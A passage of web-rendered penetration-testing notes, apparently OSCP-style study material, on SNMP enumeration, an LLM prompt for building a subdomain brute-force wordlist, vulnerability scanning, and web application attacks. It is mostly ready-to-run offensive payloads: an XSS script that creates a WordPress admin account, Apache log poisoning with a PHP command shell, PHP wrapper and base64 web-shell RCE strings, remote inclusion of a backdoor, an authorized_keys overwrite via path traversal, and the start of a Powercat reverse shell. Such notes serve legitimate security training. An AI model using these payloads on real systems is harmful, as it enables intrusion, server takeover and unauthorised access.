</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>
</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a><span class="c1">## Close the socket</span>
</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></div>
<h4 id="snmp-enumeration"><strong>SNMP Enumeration</strong></h4>
<p><strong><em>SNMP MIB TREE</em></strong></p>
<table>
<thead>
<tr>
<th>1.3.6.1.2.1.25.1.6.0</th>
<th>System Processes</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.3.6.1.2.1.25.4.2.1.2</td>
<td>Running Programs</td>
</tr>
<tr>
<td>1.3.6.1.2.1.25.4.2.1.4</td>
<td>Processes Path</td>
</tr>
<tr>
<td>1.3.6.1.2.1.25.4.2.1.5</td>
<td>Processes Param</td>
</tr>
<tr>
<td>1.3.6.1.2.1.2.2.1.2</td>
<td>Interfaces</td>
</tr>
<tr>
<td>1.3.6.1.2.1.25.2.3.1.4</td>
<td>Storage Units</td>
</tr>
<tr>
<td>1.3.6.1.2.1.25.6.3.1.2</td>
<td>Software Name</td>
</tr>
<tr>
<td>1.3.6.1.4.1.77.1.2.25</td>
<td>User Accounts</td>
</tr>
<tr>
<td>1.3.6.1.2.1.6.13.1.3</td>
<td>TCP Local Ports</td>
</tr>
</tbody>
</table>
<p><strong><em>Nmap Script Scan</em></strong></p>
<p><code>nmap -sU -p 161 --script [script_name] [target]</code></p>
<p><strong><em>Nmap Community String Brute Force</em></strong></p>
<p><code>nmap -sU -p 161 --script snmp-brute [target]</code></p>
<p><code>nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=&lt;wordlist&gt; [target]</code></p>
<p><strong><em>Wordlist</em></strong> - <em>/usr/share/wordlist/seclists/Misc/wordlist-common-snmp-community-strings.txt</em></p>
<p><strong><em>onesixtyone Community String Brute Force</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c">## Wordlist */usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt*</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">echo </span><span class="n">public</span> <span class="p">&gt;</span> <span class="n">community</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nb">echo </span><span class="n">private</span> <span class="p">&gt;&gt;</span> <span class="n">community</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="nb">echo </span><span class="n">manager</span> <span class="p">&gt;&gt;</span> <span class="n">community</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="k">for</span> <span class="n">ip</span> <span class="k">in</span> <span class="p">$(</span><span class="n">seq</span> <span class="n">1</span> <span class="n">254</span><span class="p">);</span> <span class="k">do</span> <span class="nb">echo </span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="nv">$ip</span><span class="p">;</span> <span class="n">done</span> <span class="p">&gt;</span> <span class="n">ips</span>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="n">onesixtyone</span> <span class="n">-c</span> <span class="n">community</span> <span class="n">-i</span> <span class="n">ips</span>
</span></code></pre></div>
<p><strong><em>snmpwalk Enumeration</em></strong></p>
<p><code>snmpwalk -v [1/2c/3] -c [community string] [target_ip] [MIB]</code></p>
<p><code>snmpwalk -v [1/2c/3] -c [community string] [target_ip] [MIB] -O a</code></p>
<p><strong><em>snmpwalk Change Value of an Attribute</em></strong></p>
<p><code>snmpset -v [1/2c/3] -c [community string] [target_ip] [MIB] [var type] [value]</code></p>
<h3 id="llm-powered-active-information-gathering">LLM-Powered Active Information Gathering</h3>
<h4 id="active-llm-aided-enumeration"><strong>Active LLM-Aided enumeration</strong></h4>
<p><strong><em>Generate Subdomains</em></strong> </p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Using public data from [MegacorpOne&#39;s] website and any information that can be inferred about its organizational structure, products, or services, generate a comprehensive list of potential subdomain names.
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>       Incorporate common patterns used for subdomains, such as:
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>       Infrastructure-related terms (e.g., &quot;api&quot;, &quot;dev&quot;, &quot;test&quot;, &quot;staging&quot;).
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>       Service-specific terms (e.g., &quot;mail&quot;, &quot;auth&quot;, &quot;cdn&quot;, &quot;status&quot;).
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>       Departmental or functional terms (e.g., &quot;hr&quot;, &quot;sales&quot;, &quot;support&quot;).
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>       Regional or country-specific terms (e.g., &quot;us&quot;, &quot;eu&quot;, &quot;asia&quot;).
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>       Factor in industry norms and frequently used terms relevant to [MegacorpOne&#39;s] sector.
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>Finally, compile the generated terms into a structured wordlist of 1000  words, optimized for subdomain brute-forcing against megacorpone.com
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>Ensure the output is in a clean, lowercase format with no duplicates, no bulletpoints and ready to be copied and pasted.
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>Make sure the list contains 1000 unique entries.
</span></code></pre></div>
<p><strong><em>DNS Enumeration</em></strong></p>
<p><code>gobuster dns -d [domain.com] -w [LLM Wordlist] -t 10</code></p>
<hr />
<h2 id="vulnerability-scanning">Vulnerability Scanning</h2>
<h3 id="vulnerability-scanning-with-nessus"><strong>Vulnerability Scanning with Nessus</strong></h3>
<h4 id="installing-nessus"><strong>Installing Nessus</strong></h4>
<p><strong><em>Install via Docker:</em></strong></p>
<p><code>docker pull tenable/nessus:latest-ubuntu</code></p>
<p><code>docker run --name "Nessus" -d -p 8834:8834 tenable/nessus:latest-ubuntu</code></p>
<p><strong><em>Install Locally</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>curl<span class="w"> </span>--request<span class="w"> </span>GET<span class="w"> </span><span class="se">\</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">  </span>--url<span class="w"> </span><span class="s1">&#39;https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.9.1-ubuntu1804_aarch64.deb&#39;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">  </span>--output<span class="w"> </span><span class="s1">&#39;Nessus-10.9.1-ubuntu1804_aarch64.deb&#39;</span>
</span></code></pre></div>
<p><code>sudo apt install ./Nessus-10.9.1-ubuntu1804_aarch64.deb</code></p>
<p><code>sudo systemctl start nessusd.service</code></p>
<hr />
<h3 id="vulnerability-scanning-with-nmap"><strong>Vulnerability Scanning with Nmap</strong></h3>
<h4 id="nse-vulnerability-scripts"><strong>NSE Vulnerability Scripts</strong></h4>
<p><strong><em>Nmap Scripts</em></strong></p>
<p><code>cd /usr/share/nmap/scripts/</code></p>
<p><code>cat script.db  | grep "\"vuln\"</code></p>
<p><code>sudo nmap -sV -p 443 --script "vuln" [IP]</code></p>
<p><strong><em>Run Script Manually</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve-2021-41773.nse
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>sudo<span class="w"> </span>cp<span class="w"> </span>/home/kali/Downloads/http-vuln-cve-2021-41773.nse<span class="w"> </span>/usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>--script-updatedb
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">443</span><span class="w"> </span>--script<span class="w"> </span><span class="s2">&quot;http-vuln-cve2021-41773&quot;</span><span class="w"> </span><span class="o">[</span>IP<span class="o">]</span>
</span></code></pre></div>
<hr />
<h2 id="introduction-to-web-application-attacks"><strong>Introduction to Web Application Attacks</strong></h2>
<h3 id="web-application-assessment-tools"><strong>Web Application Assessment Tools</strong></h3>
<p><strong><em>Fingerprinting Web Servers with Nmap</em></strong></p>
<ul>
<li><code>sudo nmap -p80,443  -sV [IP]</code></li>
<li><code>sudo nmap -p80 --script=http-enum [IP]</code></li>
</ul>
<p><strong><em>Technology Stack Identification with Wappalyzer</em></strong></p>
<p><a href="https://www.wappalyzer.com/lookup/crystal.ge/">Wappalyzer</a></p>
<p><strong><em>Directory Brute Force</em></strong></p>
<ul>
<li><code>ffuf -c -w [wordlist] -u [URL/FUZZ]</code></li>
<li><code>gobuster dir -w [wordlist] -u [URL] -t 5</code></li>
</ul>
<h3 id="web-application-enumeration"><strong>Web Application Enumeration</strong></h3>
<ul>
<li><strong><em>Debugging Page Content</em></strong><ul>
<li>Firefox  Debugger</li>
<li>Firefox  Inspector</li>
</ul>
</li>
<li><strong>Inspecting HTTP Response Headers and Sitemaps</strong></li>
<li><strong>Enumerating and Abusing APIs</strong><ul>
<li><code>ffuf -c -w [wordlist] -u [URL:FUZZ/v1]</code></li>
<li><code>ffuf -c -w [wordlist] -u [URL:FUZZ/v2]</code></li>
<li><code>ffuf -c -w [wordlist] -u [URL:FUZZ/v3]</code></li>
<li><code>ffuf -c -w [wordlist] -u [URL:FUZZ/v4]</code></li>
</ul>
</li>
</ul>
<h3 id="cross-site-scripting"><strong>Cross-Site Scripting</strong></h3>
<p><strong><em>Wordpress - Create admin user via XSS</em></strong></p>
<div class="language-jsx highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">ajaxRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="kd">var</span><span class="w"> </span><span class="nx">requestURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;/wp-admin/user-new.php&quot;</span><span class="p">;</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="kd">var</span><span class="w"> </span><span class="nx">nonceRegex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/ser&quot; value=&quot;([^&quot;]*?)&quot;/g</span><span class="p">;</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="nx">ajaxRequest</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">requestURL</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="nx">ajaxRequest</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="kd">var</span><span class="w"> </span><span class="nx">nonceMatch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nonceRegex</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">ajaxRequest</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="kd">var</span><span class="w"> </span><span class="nx">nonce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nonceMatch</span><span class="p">[</span><span class="mf">1</span><span class="p">];</span>
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="kd">var</span><span class="w"> </span><span class="nx">params</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;action=createuser&amp;_wpnonce_create-user=&quot;</span><span class="o">+</span><span class="nx">nonce</span><span class="o">+</span><span class="s2">&quot;&amp;user_login=attacker&amp;email=attacker@offsec.com&amp;pass1=attackerpass&amp;pass2=attackerpass&amp;role=administrator&quot;</span><span class="p">;</span>
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="nx">ajaxRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="nx">ajaxRequest</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">requestURL</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="nx">ajaxRequest</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="nx">ajaxRequest</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
</span></code></pre></div>
<p><a href="https://jscompress.com/">JSCompress - The JavaScript Compression Tool</a></p>
<p><strong><em>Encode the JavaScript code, so any bad characters won't interfere with sending the payload</em></strong></p>
<div class="language-jsx highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">encode_to_javascript</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">input</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">string</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">            </span><span class="k">for</span><span class="p">(</span><span class="nx">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">pos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">input</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">pos</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">                </span><span class="nx">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">input</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">pos</span><span class="p">);</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="nx">pos</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">                    </span><span class="nx">output</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">&quot;,&quot;</span><span class="p">;</span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">                </span><span class="p">}</span>
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">output</span><span class="p">;</span>
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="kd">let</span><span class="w"> </span><span class="nx">encoded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encode_to_javascript</span><span class="p">(</span><span class="s1">&#39;insert_minified_javascript&#39;</span><span class="p">)</span>
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">encoded</span><span class="p">)</span>
</span></code></pre></div>
<p><strong><em>Final Exploit</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>http://offsecwp<span class="w"> </span>--user-agent<span class="w"> </span><span class="s2">&quot;&lt;script&gt;eval(String.fromCharCode(Encoded Javascript Code))&lt;/script&gt;&quot;</span><span class="w"> </span>--proxy<span class="w"> </span><span class="m">127</span>.0.0.1:8080
</span></code></pre></div>
<p><strong><em>Wordpress Vulnerable Plugin:</em></strong></p>
<p><a href="https://www.exploit-db.com/exploits/36374">WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload</a></p>
<p><a href="https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin">https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin</a></p>
<hr />
<h2 id="common-web-application-attacks"><strong>Common Web Application Attacks</strong></h2>
<h3 id="directory-traversal"><strong>Directory Traversal</strong></h3>
<ul>
<li><strong><em>Absoluta Path:</em></strong><ul>
<li><code>/etc/passwd</code></li>
</ul>
</li>
<li><strong><em>Relative path:</em></strong><ul>
<li><code>../../../etc/passwd</code></li>
</ul>
</li>
</ul>
<p><strong><em>Identifying and Exploiting Directory Traversals:</em></strong></p>
<ul>
<li><strong><em>Windows:</em></strong><ul>
<li>C:\Windows\System32\drivers\etc\hosts</li>
</ul>
</li>
<li><strong><em>Linux</em></strong>:<ul>
<li>/etc/passwd</li>
</ul>
</li>
</ul>
<p><strong><em>Encoding Special Characters</em></strong>
<code>curl http://domain.com/cgi-bin/2%e/2%e/2%e/2%e/2%e/etc/passwd</code></p>
<h3 id="file-inclusion-vulnerabilities"><strong>File Inclusion Vulnerabilities</strong></h3>
<aside>


File Inclusion vulnerabilities can execute local or remote files, while Directory Traversal only allows us to read the contents of a file

</aside>

<h4 id="local-file-inclusion-lfi"><strong>Local File Inclusion (LFI)</strong></h4>
<p><strong><em>Apache Log Files</em></strong></p>
<ul>
<li><strong>Linux</strong><ul>
<li>/var/log/apache2/access.log</li>
</ul>
</li>
<li><strong>Windows</strong><ul>
<li>C:\xampp\apache\logs\</li>
</ul>
</li>
</ul>
<p><strong><em>Apache Log Poisoning</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1">#Linux</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>curl<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://doman.com/index.php?page=../../../../../var/log/apache2/access.log&quot;</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>curl<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://doman.com/index.php?page=../../../../../var/log/apache2/access.log&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: &lt;?php echo system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>curl<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://doman.com/index.php?page=../../../../../var/log/apache2/access.log&amp;cmd=whoami&quot;</span>
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="c1">#Windows</span>
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>curl<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://doman.com/index.php?page=../../../../../xampp/apache/logs/access.log&quot;</span>
</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>curl<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://doman.com/index.php?page=../../../../../xampp/apache/logs/access.log&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: &lt;?php echo system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;</span>
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>
</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="w"> </span>curl<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://doman.com/index.php?page=../../../../../xampp/apache/logs/access.log&amp;cmd=whoami&quot;</span>
</span></code></pre></div>
<h4 id="php-wrappers"><strong>PHP Wrappers</strong></h4>
<table>
<thead>
<tr>
<th>PHP Wrappers</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>/index.php?page=php://filter/read=convert.base64-encode/resource=admin.php</td>
<td>Read PHP with base64 filter</td>
</tr>
<tr>
<td>/index.php?page=data://text/plain,<?php echo system('ls');?></td>
<td>RCE with data wrapper</td>
</tr>
<tr>
<td>/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;cmd=ls</td>
<td>RCE with base64 encoded data wrapper</td>
</tr>
<tr>
<td>index.php?page=expect://id</td>
<td>RCE with expect wrapper</td>
</tr>
<tr>
<td>curl -s -X POST --data '<?php system($_GET["cmd"]); ?>'</td>
<td></td>
</tr>
<tr>
<td>"http://<SERVER_IP>:<PORT>/index.php?page=php://input&amp;cmd=id"</td>
<td>RCE with input wrapper</td>
</tr>
</tbody>
</table>
<h4 id="remote-file-inclusion-rfi"><strong>Remote File Inclusion (RFI)</strong></h4>
<aside>


We could also use a publicly-accessible file, such as one from Github.

</aside>

<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1">## Webshells - /usr/share/webshells/</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>curl<span class="w"> </span><span class="s2">&quot;http://domain.com/index.php?page=http://&lt;Local IP&gt;/simple-backdoor.php&amp;cmd=whoami&quot;</span>
</span></code></pre></div>
<h3 id="file-upload-vulnerabilities"><strong>File Upload Vulnerabilities</strong></h3>
<h4 id="using-executable-files"><strong>Using Executable Files</strong></h4>
<aside>


Upload malicious files. In case of extension blacklist, enumerate web server and framework and use extension bypass techniques accordingly. 

</aside>

<h4 id="using-non-executable-files">Using Non-Executable Files</h4>
<aside>


Leverage File Upload with Directory Traversal vulnerability, that allows us to overwrite critical files such as SSH a*uthorized_keys* file.

Example:  ***filename="../../../../../../../root/.ssh/authorized_keys***

</aside>

<aside>


When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

</aside>

<h3 id="command-injection">Command Injection</h3>
<p><strong><em>Check where command is executed (CMD/PowerShell):</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="p">(</span><span class="nb">dir </span><span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">*`|</span><span class="nb">echo </span><span class="n">CMD</span><span class="p">);&amp;</span><span class="cm">&lt;# rem #&gt;</span><span class="nb">echo </span><span class="n">PowerShell</span>
</span></code></pre></div>
<p><strong><em>Using Powercat to Create Reverse Shell</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c">#Upload Powercat to Vulnerable Windows</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">cd </span><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">powershell-empire</span><span class="p">/</span><span class="n">empire</span><span class="p">/</span><span class="n">server</span><span class="p">/</span><span class="n">data</span><span class="p">/</span><span class="n">module_source</span><span class="p">/</span><span class="n">management</span><span class="p">/</span><span class="n">powercat</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">80</span>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
